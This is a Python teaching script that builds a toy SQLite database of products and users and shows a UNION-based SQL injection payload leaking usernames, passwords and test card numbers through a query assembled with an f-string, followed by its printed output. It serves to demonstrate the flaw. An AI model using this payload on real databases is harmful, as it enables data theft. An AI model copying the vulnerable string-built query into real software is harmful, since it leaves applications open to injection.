import sqlite3

# Restart your kernel first! Then run this:

print("=" * 70)
print("🔥 SIMPLE WORKING SQL INJECTION DEMO")
print("=" * 70)

# Setup database
conn = sqlite3.connect(':memory:')
cursor = conn.cursor()

# Create tables
cursor.execute('CREATE TABLE products (id INT, name TEXT, price REAL, category TEXT)')
cursor.execute('CREATE TABLE users (id INT, username TEXT, password TEXT, credit_card TEXT)')

# Add data
cursor.executemany('INSERT INTO products VALUES (?,?,?,?)', [
    (1, 'Laptop', 999.99, 'electronics'),
    (2, 'Mouse', 29.99, 'accessories'),
])

cursor.executemany('INSERT INTO users VALUES (?,?,?,?)', [
    (1, 'admin', 'secret123', '4111-1111-1111-1111'),
    (2, 'john', 'password', '4222-2222-2222-2222'),
])
conn.commit()

print("\n📁 DATABASE CONTENTS:")
print("-" * 50)
print("\nProducts:", cursor.execute("SELECT * FROM products").fetchall())
print("Users (sensitive):", cursor.execute("SELECT * FROM users").fetchall())

print("\n" + "=" * 70)
print("💀 EXECUTING SQL INJECTION")
print("=" * 70)

# The attack - simple and works
payload = "electronics' UNION SELECT id, username, password, credit_card FROM users--"
query = f"SELECT * FROM products WHERE category = '{payload}'"

print(f"\nQuery executed: {query}")
cursor.execute(query)
results = cursor.fetchall()

print("\n🔓 RESULTS:")
print("-" * 50)
for row in results:
    print(f"  {row}")

conn.close()

"""
======================================================================
🔥 SIMPLE WORKING SQL INJECTION DEMO
======================================================================

📁 DATABASE CONTENTS:
--------------------------------------------------

Products: [(1, 'Laptop', 999.99, 'electronics'), (2, 'Mouse', 29.99, 'accessories')]
Users (sensitive): [(1, 'admin', 'secret123', '4111-1111-1111-1111'), (2, 'john', 'password', '4222-2222-2222-2222')]

======================================================================
💀 EXECUTING SQL INJECTION
======================================================================

Query executed: SELECT * FROM products WHERE category = 'electronics' UNION SELECT id, username, password, credit_card FROM users--'

🔓 RESULTS:
--------------------------------------------------
  (1, 'Laptop', 999.99, 'electronics')
  (1, 'admin', 'secret123', '4111-1111-1111-1111')
  (2, 'john', 'password', '4222-2222-2222-2222')

"""